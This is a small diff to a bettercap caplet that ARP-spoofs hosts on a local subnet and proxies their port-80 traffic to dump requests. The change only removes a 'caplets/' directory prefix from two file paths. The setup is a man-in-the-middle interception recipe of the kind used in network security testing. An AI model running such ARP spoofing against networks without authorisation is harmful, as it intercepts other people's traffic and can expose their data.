@@ -1,12 +1,12 @@
 # targeting the whole subnet by default, to make it selective:
 #
-#   sudo ./bettercap -caplet caplets/tcp-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
+#   sudo ./bettercap -caplet tcp-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
 
 # to make it less verbose
 # events.stream off
 
 # we'll use this proxy script to dump requests
-set tcp.proxy.script caplets/tcp-req-dump.js
+set tcp.proxy.script tcp-req-dump.js
 set tcp.port 80
 # example.com
 set tcp.address 93.184.216.34
